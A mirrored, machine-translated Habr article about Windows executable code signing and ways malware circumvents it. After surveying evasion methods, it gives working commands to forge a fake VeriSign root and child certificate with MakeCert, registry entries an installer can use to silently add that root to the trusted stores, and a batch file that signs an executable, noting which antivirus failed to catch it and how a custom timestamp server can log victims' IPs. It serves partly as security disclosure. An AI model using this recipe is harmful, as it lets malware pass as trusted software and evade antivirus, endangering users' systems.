<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Digital signatures in executable files and circumvention of this protection in malware</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Habra 

 Well, it seems like we managed to resolve issues with karma, but they don‚Äôt relate in any way to today's topic, but only explain a certain de...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Digital signatures in executable files and circumvention of this protection in malware</h1><div class="post__text post__text-html js-mediator-article"><img src="http://img709.imageshack.us/img709/2226/44369421.jpg" alt="image"><br>  Habra <br><br>  Well, it seems like we managed to resolve issues with karma, but they don‚Äôt relate in any way to today's topic, but only explain a certain delay in its release (initial plans were for November last year). <br><br>  Today I offer you a small overview of the system of electronic signatures of executable files and ways to circumvent and falsification of this system.  It will also be considered in detail one of the very effective ways to circumvent.  Despite the fact that the described info is already several months old, not everyone knows about it.  The manufacturers of the products described below have been notified of the material being described, so the solution to this problem, if they consider this a problem at all, is their responsibility.  Because there was plenty of time. <br><a name="habracut"></a><br>  <b>THEORY</b> 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      The idea and technology of electronic signature for executable files originated in the era of Windows NT.  Since the advent of Windows Vista, Microsoft has launched an active company to promote this technology.  As planned by the manufacturer, the signed code can only come from a trusted author of this code, and therefore is guaranteed not to harm the system and is protected from errors ( <i>three ha-ha</i> ). <br><br>  However, since the signature mechanism most often uses a fairly complex crypto-resistant mechanism, general confidence in the signed code has spread.  Anti-virus vendors also did not leave it.  True: if the code is signed, then it clearly cannot be a virus, and therefore it can be trusted a priori, thereby reducing the likelihood of false positives.  Therefore, in most modern anti-virus products, the default is to bypass the verification of signed files, which increases the scanning speed and reduces the likelihood of false positives.  Moreover, often signed programs are automatically entered into the category of "trusted" behavioral analyzers aka hips. <br><br>  It becomes clear that by signing his creations with a valid signature, the virus maker gets a rather rich audience of clients who will get infected, even with an active and regularly updated antivirus.  Obviously, this is a very tidbit, which is easily seen in the example of the already famous Stuxnet virus, where the code was signed with valid Realtek certificates (later reported on JMicron signatures). <br><br>  But this approach has a downside: after detecting a compromised signature, it immediately responds, and by the very fact AV signatories put signature detection, it is clear that with a 100% trigger.  Considering that it is extremely expensive to purchase a stolen certificate required for signing, it is clear that virus makers are interested in a total bypass of the signature verification mechanism, without valid private-keys or using self-generation of such keys.  This will allow you to bypass the protection of not only anti-virus products, but also install drivers and ActiveX-components without warnings, and generally somehow get into the world of x64, where you can‚Äôt install anything without signatures. <br><br>  But about this - more in practice. <br><br>  <b>PRACTICE</b> <br><br>  Some of the greats said that in order to get ahead of the enemy, you need to start thinking like him.  So, if we are virus makers, what can we do? <br><br>  <u>1. Copy certificate information from some clean file.</u> <br><br>  This is the most popular way at the moment.  Signature information is copied to the smallest detail, right down to the chain of trusted publishers.  It is clear that such a copy is valid only in the user's opinion.  However, what the OS displays may well confuse the inexperienced and be perceived as another glitch - still, if all the publishers are correct, then why is this signature invalid?  Alas and oh - such a majority. <br><br>  <u>2. Use self-signed certificates with a fake name.</u> <br><br>  Similarly to the above described variant, except that the chain in the certification path is not even copied. <br><br>  <u>3. Forge MD5.</u> <br><br>  Despite the fact that the weakness of the MD5 algorithm has long been described ( <a href="http://www.mscs.dal.ca/~selinger/md5collision/">here</a> and <a href="http://blog.didierstevens.com/2009/01/17/playing-withauthenticode-and-md5-collisions/">here</a> ), it is still often used in electronic signatures.  However, real examples of MD5 hacking concern either very small files or lead to malfunctioning of the code.  In practice, there are no viruses with fake hacked signatures on the MD5 algorithm, but nevertheless this method is theoretically possible. <br>  <u>4. Obtain a certificate under the usual procedure and use it for malicious purposes.</u> <br><br>  One of the most common methods of the authors of the so-called riskware, adware and fake antiviruses.  An example would be the fake Perfect Defender (standard divorce: ‚Äúscan for free - you have a virus - pay us and we will remove it‚Äù) exists with the signatures of several companies: <br>  ‚Ä¢ Jeansovi llc <br>  ‚Ä¢ Perfect Software llc <br>  ‚Ä¢ Sovinsky llc <br>  ‚Ä¢ Trambambon llc <br><br>  How this is done well can tell our domestic developers of Vinlockers, writing in small letters about the "joke program", etc., thus protecting themselves from an article on fraud.  That's how we live‚Ä¶ <br><br>  It is interesting that absolutely normal programs with the following names of owners really exist: <br>  ‚Ä¢ Verified Software <br>  ‚Ä¢ Genuine Software Update Limited <br>  ‚Ä¢ Browser plugin <br><br>  It is clear that if you really believe this, then it is easy to make a mistake when you first look at the certificate. <br><br>  It should also be noted that it is not difficult to obtain a signature from certification centers.  For example, RapidSSL for verification uses just e-mail.  If the correspondence is conducted from addresses like admin, administrator, hostmaster, info, is, it, mis, postmaster, root, ssladmin, <br>  ssladministrator, sslwebmaster, sysadmin or webmaster@somedomain.com - it‚Äôs obvious that the domain owner is writing, right?  ( <i>three more haha</i> ).  But the glorious company Digital River (DR), a commercial outsourcing and e-commerce, generally provides certificates to all its customers.  No wonder that MSNSpyMonitor, WinFixer, QuickKeyLogger, ErrorSafe, ESurveiller, SpyBuddy, TotalSpy, Spynomore, Spypal and generally about 0.6% of all DR-signed files are malware, and potentially more than that ‚Äî more than 5% of all DR-signed files . <br><br>  For the sake of fairness, I note that signing the x64 driver is far from being so easy, in this case no violations have been noticed so far. <br><br>  <u>5. Find an employee of a trusted company and ask him to sign your code.</u> <br><br>  No comments.  Everyone loves money.  The question is only in the amount :) <br><br>  <u>6. Steal certificate.</u> <br><br>  At the moment, there are three large families of Trojans known, "sharpened", in particular, under theft of certificates.  It: <br>  ‚Ä¢ Adrenalin <br>  ‚Ä¢ Ursnif <br>  ‚Ä¢ Zeus <br>  ‚Ä¢ SpyEye (possible) <br><br>  Nonetheless, no massive cases of the use of stolen certificates in new versions of these Trojans have been noticed.  Perhaps this is a trump card in the sleeve?  Time will tell‚Ä¶ <br><br>  <u>7. Infect the development system of a trusted developer and inject malicious code into releases before signing.</u> <br><br>  A vivid example of such an infection is the concept virus Induc.a.  The virus injects the code at compile time, infecting the development system.  As a result, the developer does not even know that an invisible ‚Äúappendage‚Äù appeared in his program.  The release passes the signature and is published with a full certificate.  See the gopher?  And he is!  ;) <br><br>  Fortunately, Induc.a is only PoC, performing only the infection of development systems without implementing any additional malicious functionality. <br><br>  And now - the promised snacks. <br><br>  <b>VULNERABILITY OR HOW I HAVE CONDUCTED THIS SUMMER</b> <br><br>  As you can see, there are quite a few options for circumventing a signature.  In our example, we will consider the modified version 1 and 2, described above. <br><br>  So what do we need? <br>  - MakeCert.exe <br>  - cert2spc.exe <br>  - sign.exe <br>  - ruki.sys <br>  - mozg.dll <br><br>  I think that it will not be difficult for the operator to find these components, but for the most lazy I post the first three <a href="http://www.onlinedisk.ru/file/594478/">here</a> .  I don‚Äôt post the last two in view of the hard binding to the hardware, the complete lack of cross-platform and specificity of the code :) <br><br>  So, create a certificate of a trusted publisher.  Let's try to copy as much information as possible about the same VeriSign: <br> <code>MakeCert.exe -# 7300940696719857889 -$ commercial -n CN="VeriSign Class 3 Code Signing 2009-2 CA" -a sha1 -sky signature -l "https://www.verisign.com/rpa" -cy authority -m 12 -h 2 -len 1024 -eku 1.3.6.1.5.5.7.3.2,1.3.6.1.5.5.7.3.3 -r -sv veri.pvk veri.cer</code> <br> <br>  As a result of execution, we will get veri.pvk and veri.cer suitable for signing. <br><br>  Now we will create a child certificate using just received: <br><br> <code>MakeCert.exe -# 8928659211875058207 -$ commercial -n CN="Home Sweet Home" -a sha1 -sky signature -l "http://habrahabr.ru/" -ic veri.cer -iv veri.pvk -cy end -m 12 -h 2 -len 1024 -eku 1.3.6.1.5.5.7.3.3 -sv kl.pvk kl.cer</code> <br> <br>  As a result, we obtain kl.pvk and kl.cer, which will be trusted certificates from an untrusted publisher.  The chain can continue for a long time, fooling the naive user.  But there will be one result: the certificate will not be valid, because there is one untrusted element in the chain.  BUT! <br><br>  On Windows, it is possible to install any certificate, including a self-signed certificate, as a trusted one.  This is convenient: in some cases, the developer can make a self-signed certificate, enter it into the trusted and work quietly with their applications.  In our case, this is doubly convenient, because as such it is - obviously, simply entering information into the registry.  what is the information is not specific to a particular system. <br><br>  We will install any registry monitor on our test virtual machine, and then we will add our desired certificate from supposedly VeriSign to trusted ones.  Track where the change happened - and voila!  We can dump the corresponding branch of the registry, and then shove it into the installer.  In total, our installer enters the registry, automatically turning the certificate of the primary publisher into a trusted one and validating the entire chain. <br><br>  In order not to finally open all the cards, I will only say that in my case the registry dump looked like <br> <code>Windows Registry Editor Version 5.00 <br> <br> [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SystemCertificates\AuthRoot\Certificates\A61F9F1A51BBCA24218F9D14611AFBA61B86C14C] <br> "Blob"=hex:04,00,00,.....</code> <br> <br>  well, or if only for the current user, then <br> <code>Windows Registry Editor Version 5.00 <br> <br> [HKEY_CURRENT_USER\Software\Microsoft\SystemCertificates\Root\Certificates\A61F9F1A51BBCA24218F9D14611AFBA61B86C14C] <br> "Blob"=hex:04,00,00,.....</code> <br> <br>  Having entered this data into the registry, the program with the fake chain of signatures was automatically tested by sigverif.exe.  Well, to sign our code with the received certificate is generally simple, a batch file is enough: <br><br> <code>cert2spc.exe kl.cer kl.spc <br> sign.exe -spc kl.spc -v kl.pvk -n "My Installer" -i "http://habrahabr.ru" -ky signature -$ commercial -a sha1 -t "http://timestamp.verisign.com/scripts/timstamp.dll" myprogram.exe <br> del kl.spc</code> <br> <br>  Pay attention to the use of <a href="">timestamp.stais.verisign.com/scripts/timstamp.dll</a> - theoretically it is quite possible to use your own server on your own domain, which will allow every time to see that someone checked the signature of our program on your computer, which means getting IP and checkout time.  Really convenient?  ;) <br><br>  The funny thing is that at the time of writing the material back in October-November of 2010, Kaspersky Internet Security 2011 did not track the specified registry branches, and the validation of the chain was left to the discretion of the OS, which we simply inflated.  I do not know what is now, but it seems like some branches have blocked ... Check, unsubscribe! <br><br>  It should be noted that for the creation of signatures it is possible to use specific software that is not available in public.  It is clear that it does not break the signature, but it gives much more flexible possibilities to fill in the X500 fields, which creates an appearance of validity even better.  <a href="http://www.onlinedisk.ru/file/594480/">Here you</a> can download a curious example.  The archive contains the popular replacement file Notepad bred3_2k ( <a href="http://www.astonshell.ru/freeware/bred3/">offsite</a> ) with and without a Microsoft signature :) To make the signature completely valid, it is enough to make changes to the registry contained in the key + .reg file.  Similarly, the key -.reg file overrides these changes.  Track the certification path - it's curious :) <br><br>  <b>Immediately I draw attention</b> to the fact that the author of the ‚Äúexample‚Äù has registered his own timestamp server, so that any manipulations will lead to the fact that the author finds out your IP - and further, as described.  If you want, you can track these appeals and unsubscribe in the comments;) <br><br>  If necessary, in the next article I will tell you how to configure hips to protect the corresponding registry branches in order to avoid the introduction of certificates into trusted ones.  Unsubscribe in the comments - it is possible that this vulnerability has already been fixed. <br><br>  <i>The article used the presentation material Jarno Niemela (F-Secure).</i> </div><p>Source: <a href="https://habr.com/ru/post/112289/">https://habr.com/ru/post/112289/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../112276/index.html">The consequences of using Copy-Paste technology when programming in C ++ and how to deal with it</a></li>
<li><a href="../112277/index.html">Test drive templates. Free for 30 days</a></li>
<li><a href="../112281/index.html">How to make a successful career at IBM headquarters?</a></li>
<li><a href="../112286/index.html">FileSystem API & File API: we understand and use</a></li>
<li><a href="../112287/index.html">Unity3D for beginners - Tutorial 1</a></li>
<li><a href="../112290/index.html">NetUP CAS and Middleware certified by the Ministry of Communications of the Russian Federation</a></li>
<li><a href="../112291/index.html">jQuery plugin for Ajax video upload on YouTube</a></li>
<li><a href="../112292/index.html">Evolution of the Python programmer</a></li>
<li><a href="../112294/index.html">Experience of implementing 1C UAT at a distribution center</a></li>
<li><a href="../112295/index.html">First impressions of the development under Android - we write handsfree</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>